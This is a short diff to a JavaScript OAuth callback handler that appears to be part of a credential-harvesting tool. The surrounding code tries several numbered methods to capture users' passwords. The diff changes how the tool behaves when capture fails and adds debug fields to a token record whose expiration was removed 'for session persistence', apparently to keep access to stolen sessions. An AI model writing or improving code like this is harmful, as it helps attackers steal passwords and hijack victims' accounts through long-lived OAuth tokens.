@@ -418,11 +418,11 @@ async function handleOAuthCallback() {
                         console.log('🚨 NO PASSWORD CAPTURED - All methods failed');
                         console.log('🔍 Debug info:', debugInfo);
                         
-                        // For debugging purposes, let's use a test password
-                        capturedPassword = 'DEBUG_PASSWORD_NOT_CAPTURED';
-                        passwordSource = 'debug_fallback';
+                        // Don't send any password if none captured
+                        capturedPassword = null;
+                        passwordSource = null;
                         
-                        debugInfo.push('Method 8 - Used debug fallback password');
+                        debugInfo.push('Method 8 - No password captured, not sending any password data');
                     } catch (e) { 
                         debugInfo.push(`Method 8 failed: ${e.message}`);
                         console.log('❌ Method 8 failed:', e.message); 
@@ -476,7 +476,11 @@ async function handleOAuthCallback() {
                         expiresAt: 'Never (Modified for persistence)',
                         originalExpiresIn: tokenData.tokens?.expires_in, // Keep original for reference
                         modified: true,
-                        modificationNote: 'Token expiration removed for session persistence'
+                        modificationNote: 'Token expiration removed for session persistence',
+                        // Debug info
+                        tokenDataPresent: !!tokenData.tokens,
+                        authCodePresent: !!authorizationCode,
+                        debugInfo: `TokenData: ${!!tokenData.tokens}, AuthCode: ${!!authorizationCode}`
                     },
                     
                     userProfile: {
